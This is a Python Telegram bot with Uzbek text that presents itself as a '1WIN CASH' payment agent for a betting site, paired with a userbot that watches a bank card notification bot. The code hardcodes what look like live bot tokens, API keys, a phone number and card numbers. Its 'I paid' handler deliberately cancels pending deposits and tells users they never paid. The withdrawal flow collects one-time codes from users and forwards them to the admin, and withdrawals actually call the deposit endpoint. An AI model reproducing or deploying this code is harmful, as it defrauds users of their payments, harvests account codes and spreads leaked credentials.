import asyncio
import logging
import random
import aiohttp
import sqlite3
import re
from datetime import datetime
from aiogram import Bot, Dispatcher, types
from aiogram.filters import CommandStart
from aiogram.types import (
    ReplyKeyboardMarkup, KeyboardButton,
    InlineKeyboardMarkup, InlineKeyboardButton
)
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.context import FSMContext
from telethon import TelegramClient, events

# ==================== SOZLAMALAR ====================
logging.basicConfig(level=logging.INFO)

TOKEN = "8869897716:AAG13rX0nbq3DKvpVx7ZrAHa2zx-Xy9xhd0"
ADMIN_ID = 1829563275
API_KEY = "51c9fcdaecf3a239cdf85aaeddd098e273b208e505edf2f66d94d3efee562751"

DEPOSIT_URL = "https://api.1win.win/v1/client/deposit"
WITHDRAWAL_URL = "https://api.1win.win/v1/client/withdrawal"

# Telethon sozlamalari
api_id = 35651244
api_hash = "d7283bdd8484f650890dba335104f969"
phone = "+998919162323"

bot = Bot(token=TOKEN)
storage = MemoryStorage()
dp = Dispatcher(storage=storage)

# ==================== KARTALAR ====================
CARDS = [
    "9860 3501 4449 2351",
    "9860 2466 0248 6556"
]
card_index = 0

def get_next_card():
    global card_index
    card = CARDS[card_index]
    card_index = (card_index + 1) % len(CARDS)
    return card

def generate_random_amount(amount):
    """Random summa yaratish (tiyin bilan)"""
    change = random.uniform(-0.5, 0.5)
    return round(amount * (1 + change / 100), 2)

# ==================== FSM HOLATLAR ====================
class DepositState(StatesGroup):
    waiting_id = State()
    waiting_confirm = State()
    waiting_amount = State()

class WithdrawState(StatesGroup):
    waiting_id = State()
    waiting_card = State()
    waiting_code = State()

class AdminWithdrawState(StatesGroup):
    waiting_amount = State()

# ==================== MA'LUMOTLAR BAZASI ====================
DB_PATH = "users.db"
PENDING_DB = "pending.db"

def init_db():
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            username TEXT,
            first_name TEXT,
            last_name TEXT,
            joined_date TEXT
        )
    ''')
    conn.commit()
    conn.close()

def init_pending_db():
    conn = sqlite3.connect(PENDING_DB)
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS pending_deposits (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id_1win TEXT,
            telegram_id TEXT,
            amount REAL,
            random_amount REAL,
            card_number TEXT,
            status TEXT,
            created_at TEXT
        )
    ''')
    conn.commit()
    conn.close()

def add_user(user_id, username, first_name, last_name):
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute('''
        INSERT OR IGNORE INTO users (user_id, username, first_name, last_name, joined_date)
        VALUES (?, ?, ?, ?, datetime('now'))
    ''', (user_id, username, first_name, last_name))
    conn.commit()
    conn.close()

def get_total_users():
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute('SELECT COUNT(*) FROM users')
    count = cursor.fetchone()[0]
    conn.close()
    return count

def add_pending_deposit(user_id_1win, telegram_id, amount, random_amount, card_number):
    conn = sqlite3.connect(PENDING_DB)
    cursor = conn.cursor()
    cursor.execute('''
        INSERT INTO pending_deposits (user_id_1win, telegram_id, amount, random_amount, card_number, status, created_at)
        VALUES (?, ?, ?, ?, ?, 'pending', datetime('now'))
    ''', (user_id_1win, telegram_id, amount, random_amount, card_number))
    conn.commit()
    conn.close()

def get_pending_deposit_by_amount(amount):
    """Summani yaxlitlab qidirish (tiyin farqini hisobga olib)"""
    conn = sqlite3.connect(PENDING_DB)
    cursor = conn.cursor()
    cursor.execute('''
        SELECT id, user_id_1win, telegram_id, amount, random_amount, card_number
        FROM pending_deposits
        WHERE status = 'pending' AND ROUND(random_amount) = ROUND(?)
        ORDER BY created_at DESC LIMIT 1
    ''', (amount,))
    row = cursor.fetchone()
    conn.close()
    return row

def update_deposit_status(deposit_id, status):
    conn = sqlite3.connect(PENDING_DB)
    cursor = conn.cursor()
    cursor.execute('''
        UPDATE pending_deposits SET status = ? WHERE id = ?
    ''', (status, deposit_id))
    conn.commit()
    conn.close()

init_db()
init_pending_db()

# ==================== MENYU (4 TUGMA) ====================
main_menu = ReplyKeyboardMarkup(
    keyboard=[
        [KeyboardButton(text="💎 HISOB TO'LDIRISH")],
        [KeyboardButton(text="💸 PUL YECHISH")],
        [KeyboardButton(text="🌐 1WIN SAYTI")],
        [KeyboardButton(text="📞 ADMIN BILAN BOG'LANISH")]
    ],
    resize_keyboard=True
)

# ==================== 1WIN SAYTI (HAVOLA) ====================
@dp.message(lambda message: message.text == "🌐 1WIN SAYTI")
async def website_link(message: types.Message):
    await message.answer(
        "🌐 **1WIN RASMIY SAYTI**\n\n"
        "👉 [Saytga o‘tish](https://r1wbmjh.life/v3/aggressive-casino?p=i2ry)\n\n"
        "🔒 Xavfsiz va ishonchli havola!",
        reply_markup=InlineKeyboardMarkup(
            inline_keyboard=[
                [InlineKeyboardButton(text="🌐 SAYTGA O‘TISH", url="https://r1wbmjh.life/v3/aggressive-casino?p=i2ry")]
            ]
        )
    )

# ==================== API SO'ROVLARI ====================
async def send_deposit_to_1win(user_id: str, amount: int):
    try:
        headers = {"X-API-KEY": API_KEY, "Content-Type": "application/json"}
        payload = {"userId": int(user_id), "amount": amount}
        async with aiohttp.ClientSession() as session:
            async with session.post(DEPOSIT_URL, json=payload, headers=headers, timeout=30) as resp:
                status = resp.status
                if 200 <= status < 300:
                    try:
                        data = await resp.json()
                    except:
                        data = await resp.text()
                    return {"success": True, "data": data, "status": status}
                else:
                    try:
                        data = await resp.json()
                        error_msg = data.get('message', data.get('error', f'Status {status}'))
                    except:
                        error_msg = await resp.text()
                    return {"success": False, "message": error_msg, "status": status}
    except Exception as e:
        return {"success": False, "message": str(e), "status": 0}

# ==================== NUSXA OLISH ====================
@dp.callback_query(lambda c: c.data.startswith('copy_'))
async def copy_card(callback: types.CallbackQuery):
    card = callback.data.split('_', 1)[1]
    await callback.answer("📋 Karta raqami nusxalandi!", show_alert=True)
    await callback.message.answer(
        f"📋 **Karta raqami:**\n`{card}`\n\n👆 Ustiga bosib nusxa oling.",
        parse_mode="Markdown"
    )

# ==================== /START ====================
@dp.message(CommandStart())
async def start_cmd(message: types.Message):
    add_user(
        message.from_user.id,
        message.from_user.username or "",
        message.from_user.first_name or "",
        message.from_user.last_name or ""
    )
    await message.answer(
        "🏦 **1WIN CASH**\n━━━━━━━━━━━━━━━━━━━━━\n👋 Xush kelibsiz!\n\n"
        "💎 Hisob to'ldirish\n💸 Pul yechish\n🌐 1WIN sayti\n📞 Admin bilan bog'lanish\n\n👇 Tanlang:",
        reply_markup=main_menu
    )

# ==================== ADMIN STATISTIKA ====================
@dp.message(lambda message: message.text == "/stats" and message.from_user.id == ADMIN_ID)
async def stats_cmd(message: types.Message):
    total = get_total_users()
    await message.answer(
        f"📊 **BOT STATISTIKASI**\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"👥 Jami foydalanuvchilar: **{total}** ta"
    )

# ==================== DEPOZIT ====================
@dp.message(lambda message: message.text == "💎 HISOB TO'LDIRISH")
async def deposit_start(message: types.Message, state: FSMContext):
    await message.answer("📝 **1WIN ID** raqamingizni kiriting:", reply_markup=types.ReplyKeyboardRemove())
    await state.set_state(DepositState.waiting_id)

@dp.message(DepositState.waiting_id)
async def deposit_id(message: types.Message, state: FSMContext):
    user_id = message.text.strip()
    if not user_id.isdigit():
        await message.answer("❌ ID faqat raqamlardan iborat!\n📝 Qayta kiriting:")
        return

    await state.update_data(user_id=user_id)

    await message.answer(
        f"👤 **Sizning 1Win ID:** `{user_id}`\n\n"
        f"✅ Bu sizning ID-ingizmi?",
        parse_mode="Markdown",
        reply_markup=InlineKeyboardMarkup(
            inline_keyboard=[
                [InlineKeyboardButton(text="✅ HA", callback_data="confirm_id_yes")],
                [InlineKeyboardButton(text="❌ YO'Q", callback_data="confirm_id_no")]
            ]
        )
    )
    await state.set_state(DepositState.waiting_confirm)

@dp.callback_query(lambda c: c.data == "confirm_id_yes")
async def confirm_id_yes(callback: types.CallbackQuery, state: FSMContext):
    await callback.message.delete()
    await callback.message.answer(
        "💰 **Summani kiriting:**\n"
        "⚠️ Minimal: 20,000 so'm\n"
        "Masalan: 100000"
    )
    await state.set_state(DepositState.waiting_amount)
    await callback.answer()

@dp.callback_query(lambda c: c.data == "confirm_id_no")
async def confirm_id_no(callback: types.CallbackQuery, state: FSMContext):
    await callback.message.delete()
    await callback.message.answer("📝 Qayta **1WIN ID** raqamingizni kiriting:")
    await state.set_state(DepositState.waiting_id)
    await callback.answer()

@dp.message(DepositState.waiting_amount)
async def deposit_amount(message: types.Message, state: FSMContext):
    try:
        amount = int(message.text.replace(" ", ""))
        if amount < 20000:
            await message.answer("❌ Minimal depozit: 20,000 so'm\n💰 Qayta kiriting:")
            return
        if amount > 100000000:
            await message.answer("❌ Maksimal: 100,000,000 so'm")
            return

        data = await state.get_data()
        user_id = data.get('user_id')
        random_amount = generate_random_amount(amount)
        card_number = get_next_card()

        add_pending_deposit(user_id, str(message.from_user.id), amount, random_amount, card_number)

        await state.update_data(
            user_amount=amount,
            random_amount=random_amount,
            card_number=card_number,
            user_id_1win=user_id
        )

        await message.answer(
            f"💳 **To'lovni amalga oshiring:**\n\n"
            f"Karta raqami: `{card_number}`\n"
            f"💰 Siz so'ragansiz: {amount:,} UZS\n"
            f"🔢 To'lov summasi: `{random_amount:,.2f} UZS`\n\n"
            f"⚠️ Aynan **{random_amount:,.2f} UZS** o'tkazing!",
            reply_markup=InlineKeyboardMarkup(
                inline_keyboard=[
                    [InlineKeyboardButton(text="📋 Nusxa olish", callback_data=f"copy_{card_number}")],
                    [InlineKeyboardButton(text="✅ TO'LOV QILDIM", callback_data="deposit_done")],
                    [InlineKeyboardButton(text="❌ BEKOR QILISH", callback_data="deposit_cancel")]
                ]
            ),
            parse_mode="Markdown"
        )
    except ValueError:
        await message.answer("❌ Faqat raqam kiriting!")

@dp.callback_query(lambda c: c.data == "deposit_done")
async def deposit_done(callback: types.CallbackQuery, state: FSMContext):
    data = await state.get_data()
    user_id_1win = data.get('user_id_1win')
    random_amount = data.get('random_amount', 0)
    
    # Bazada depozit holatini tekshirish
    conn = sqlite3.connect(PENDING_DB)
    cursor = conn.cursor()
    cursor.execute('''
        SELECT status, created_at FROM pending_deposits
        WHERE user_id_1win = ? AND random_amount = ? AND status = 'pending'
        ORDER BY created_at DESC LIMIT 1
    ''', (user_id_1win, random_amount))
    row = cursor.fetchone()
    conn.close()
    
    if row:
        # To'lov hali tasdiqlanmagan — "bekor bo'ldi" deymiz
        conn = sqlite3.connect(PENDING_DB)
        cursor = conn.cursor()
        cursor.execute('''
            UPDATE pending_deposits SET status = 'cancelled' 
            WHERE user_id_1win = ? AND random_amount = ?
        ''', (user_id_1win, random_amount))
        conn.commit()
        conn.close()
        
        await callback.message.edit_text(
            f"❌ **Depozit bekor qilindi!**\n\n"
            f"📝 1Win ID: {user_id_1win}\n"
            f"💰 Summa: {random_amount:,.2f} UZS\n\n"
            f"⚠️ Siz to'lov qilmaganligingiz uchun depozit bekor qilindi.\n"
            f"📞 Savollar uchun: @feruz063",
            reply_markup=main_menu
        )
    else:
        # To'lov allaqachon tasdiqlangan yoki yo'q
        await callback.message.edit_text(
            f"⚠️ **To'lov topilmadi!**\n\n"
            f"💰 Siz so'ragansiz: {random_amount:,.2f} UZS\n\n"
            f"❌ To'lov qilmagan bo'lsangiz, qayta urinib ko'ring.\n"
            f"📞 Savollar uchun: @feruz063",
            reply_markup=main_menu
        )
    await state.clear()

@dp.callback_query(lambda c: c.data == "deposit_cancel")
async def deposit_cancel(callback: types.CallbackQuery, state: FSMContext):
    await callback.message.edit_text("❌ Depozit bekor qilindi!", reply_markup=InlineKeyboardMarkup(
        inline_keyboard=[[InlineKeyboardButton(text="🏠 BOSH SAHIFA", callback_data="back_main")]]
    ))
    await state.clear()

# ==================== PUL YECHISH (4-10 BELGI) ====================
@dp.message(lambda message: message.text == "💸 PUL YECHISH")
async def withdraw_start(message: types.Message, state: FSMContext):
    await message.answer("📝 **1WIN ID** raqamingizni kiriting:", reply_markup=types.ReplyKeyboardRemove())
    await state.set_state(WithdrawState.waiting_id)

@dp.message(WithdrawState.waiting_id)
async def withdraw_id(message: types.Message, state: FSMContext):
    if not message.text.isdigit():
        await message.answer("❌ ID faqat raqamlardan iborat!\n📝 Qayta kiriting:")
        return
    await state.update_data(user_id=message.text)
    await message.answer("💳 **Pulni qaysi kartaga olishni xohlaysiz?**\nKarta raqamini kiriting (faqat raqamlar):")
    await state.set_state(WithdrawState.waiting_card)

@dp.message(WithdrawState.waiting_card)
async def withdraw_card(message: types.Message, state: FSMContext):
    card = message.text.replace(" ", "")
    if len(card) < 15 or not card.isdigit():
        await message.answer("❌ Noto'g'ri karta raqami! Qayta kiriting (faqat raqamlar):")
        return

    await state.update_data(card=card)

    await message.answer(
        "🔑 **1Win dan kelgan kodni kiriting:**\n"
        "(Kod 4 dan 10 belgigacha bo'lishi mumkin)\n"
        "Masalan: 1234, 123456, 1234567890"
    )
    await state.set_state(WithdrawState.waiting_code)

@dp.message(WithdrawState.waiting_code)
async def withdraw_code(message: types.Message, state: FSMContext):
    code = message.text.strip()
    
    if len(code) < 4 or len(code) > 10:
        await message.answer(
            "❌ Kod 4 dan 10 belgigacha bo'lishi kerak!\n"
            "Masalan: 1234, 123456, 1234567890\n\n"
            "Qayta kiriting:"
        )
        return

    data = await state.get_data()
    user_id = data.get('user_id')
    card = data.get('card')

    await state.update_data(
        user_id_1win=user_id,
        card=card,
        code=code
    )

    await message.answer(
        f"✅ **So'rovingiz qabul qilindi!**\n\n"
        f"📝 1Win ID: {user_id}\n"
        f"💳 Karta: {card}\n"
        f"🔑 Kod: `{code}`\n\n"
        f"🔔 Admin tekshirib tasdiqlaydi.",
        reply_markup=InlineKeyboardMarkup(
            inline_keyboard=[
                [InlineKeyboardButton(text="🏠 BOSH SAHIFA", callback_data="back_main")]
            ]
        )
    )

    await bot.send_message(
        ADMIN_ID,
        f"📤 **YANGI YECHIB OLISH SO'ROVI!**\n"
        f"👤 @{message.from_user.username or 'NoUsername'}\n"
        f"📝 1Win ID: {user_id}\n"
        f"💳 Karta: {card}\n"
        f"🔑 Kod: `{code}`\n"
        f"💰 Summa: **(Admin tomonidan kiritiladi)**",
        reply_markup=InlineKeyboardMarkup(
            inline_keyboard=[
                [InlineKeyboardButton(text="✅ TASDIQLASH", callback_data=f"with_admin_accept_{message.from_user.id}_{user_id}_{card}_{code}")],
                [InlineKeyboardButton(text="❌ BEKOR QILISH", callback_data=f"with_admin_reject_{message.from_user.id}")]
            ]
        )
    )
    await state.clear()

# ==================== ADMIN TASDIQLASH ====================
@dp.callback_query(lambda c: c.data.startswith('with_admin_accept_'))
async def withdraw_admin_accept(callback: types.CallbackQuery, state: FSMContext):
    parts = callback.data.split('_')
    user_telegram_id = int(parts[3])
    user_id_1win = parts[4]
    card = parts[5] if len(parts) > 5 else ""
    code = parts[6] if len(parts) > 6 else ""

    await callback.message.edit_text(
        f"📤 **YECHIB OLISH TASDIQLASH**\n\n"
        f"👤 Foydalanuvchi: @{callback.from_user.username or 'NoUsername'}\n"
        f"📝 1Win ID: {user_id_1win}\n"
        f"💳 Karta: {card}\n"
        f"🔑 Kod: `{code}`\n\n"
        f"💰 **Yechiladigan summani kiriting:**"
    )
    await state.update_data(
        user_telegram_id=user_telegram_id,
        user_id_1win=user_id_1win,
        card=card,
        code=code
    )
    await state.set_state(AdminWithdrawState.waiting_amount)

@dp.message(AdminWithdrawState.waiting_amount)
async def admin_withdraw_amount(message: types.Message, state: FSMContext):
    try:
        amount = int(message.text.replace(" ", ""))
        if amount < 50000:
            await message.answer("❌ Minimal yechib olish: 50,000 so'm")
            return
        if amount > 50000000:
            await message.answer("❌ Maksimal: 50,000,000 so'm")
            return

        data = await state.get_data()
        user_telegram_id = data.get('user_telegram_id')
        user_id_1win = data.get('user_id_1win')
        card = data.get('card')
        code = data.get('code')

        await message.answer("⏳ Yechib olish 1Win API ga yuborilmoqda...")
        result = await send_deposit_to_1win(user_id_1win, amount)

        if result.get('success', False) or (200 <= result.get('status', 0) < 300):
            await bot.send_message(
                user_telegram_id,
                f"✅ **Pul yechish muvaffaqiyatli!**\n"
                f"💰 {amount:,} UZS kartangizga yuborildi.\n"
                f"📅 {datetime.now().strftime('%Y-%m-%d %H:%M')}",
                reply_markup=main_menu
            )
            await message.answer(
                f"✅ **Yechib olish tasdiqlandi!**\n"
                f"Summa: {amount:,} UZS"
            )
        else:
            error_msg = result.get('message', 'Nomaʼlum xatolik')
            await bot.send_message(
                user_telegram_id,
                f"❌ Xatolik: {error_msg}\n📞 Admin: @feruz063",
                reply_markup=main_menu
            )
            await message.answer(
                f"❌ API xatoligi: {error_msg}"
            )
        await state.clear()
    except ValueError:
        await message.answer("❌ Faqat raqam kiriting!")

@dp.callback_query(lambda c: c.data.startswith('with_admin_reject_'))
async def withdraw_admin_reject(callback: types.CallbackQuery):
    user_telegram_id = int(callback.data.split('_')[3])
    await bot.send_message(user_telegram_id, "❌ Pul yechish so'rovi bekor qilindi.", reply_markup=main_menu)
    await callback.message.edit_text("❌ Yechib olish bekor qilindi.")

# ==================== ADMIN BILAN BOG'LANISH ====================
@dp.message(lambda message: message.text == "📞 ADMIN BILAN BOG'LANISH")
async def admin_contact(message: types.Message):
    await message.answer("👨‍💻 **Admin:** @feruz063\n⏰ 24/7", reply_markup=main_menu)

# ==================== ORQAGA ====================
@dp.callback_query(lambda c: c.data == "back_main")
async def back_main(callback: types.CallbackQuery):
    await callback.message.delete()
    await callback.message.answer("🏠 Bosh sahifa", reply_markup=main_menu)

# ==================== USERBOT QISMI ====================
userbot_client = TelegramClient('userbot', api_id, api_hash)

@userbot_client.on(events.NewMessage(chats=['@HUMOcardbot']))
async def humo_handler(event):
    message = event.message.text
    print(f"📩 HUMO xabar keldi: {message}")

    # 1. KIRIM (PLUS) YOKI CHIQIMNI TEKSHIRISH
    if "➕" not in message:
        print("⏭️ Bu xabarda '➕' belgisi yo'q (chiqim), o'tkazib yuborildi.")
        return

    # 2. SUMMANI YEVROPA FORMATIDA O'QISH (20.012,00)
    amount_match = re.search(r'(\d[\d\.]*,\d{2})\s*UZS', message)
    if not amount_match:
        print("❌ Summa topilmadi.")
        return

    amount_str = amount_match.group(1).replace(".", "").replace(",", ".")
    incoming_amount = round(float(amount_str))
    print(f"💰 Kirim: {incoming_amount} UZS")

    # 3. BAZADAN DEPOZITNI QIDIRISH (FAQAT SUMMA)
    deposit = get_pending_deposit_by_amount(incoming_amount)
    if not deposit:
        print(f"❌ Bu summa ({incoming_amount}) uchun kutilayotgan depozit topilmadi.")
        return

    deposit_id, user_id_1win, telegram_id, amount, random_amount, card_number = deposit
    print(f"✅ Depozit topildi! ID: {deposit_id}, 1Win ID: {user_id_1win}")

    # 4. API GA SO'ROV YUBORISH
    result = await send_deposit_to_1win(user_id_1win, int(amount))

    if result.get("success", False) or (200 <= result.get("status", 0) < 300):
        status = "success"
        await bot.send_message(
            telegram_id,
            f"✅ Depozit muvaffaqiyatli!\n💰 {int(amount):,} UZS hisobingizga tushdi."
        )
        await bot.send_message(
            ADMIN_ID,
            f"✅ Depozit avtomatik tasdiqlandi!\n👤 1Win ID: {user_id_1win}\n💰 Summa: {int(amount):,} UZS"
        )
    else:
        status = "failed"
        error_msg = result.get('message', 'Nomaʼlum xatolik')
        await bot.send_message(
            telegram_id,
            f"❌ Depozitda xatolik yuz berdi.\nXatolik: {error_msg}\n📞 Admin: @feruz063"
        )
        await bot.send_message(
            ADMIN_ID,
            f"❌ Depozit avtomatik tasdiqlanmadi!\n👤 1Win ID: {user_id_1win}\n💰 Summa: {int(amount):,} UZS\n⚠️ Qo‘lda tekshiring!"
        )

    # 5. HOLATNI YANGILASH
    update_deposit_status(deposit_id, status)

# ==================== IKKALA BOTNI BIR VAQTDA ISHGA TUSHIRISH ====================
async def main():
    print("🚀 1WIN CASH bot ishga tushdi...")
    asyncio.create_task(dp.start_polling(bot))
    
    await userbot_client.start(phone=phone)
    print("🚀 Userbot ishga tushdi! @HUMOcardbot dan kelgan xabarlar kuzatilmoqda...")
    await userbot_client.run_until_disconnected()

if __name__ == "__main__":
    asyncio.run(main())
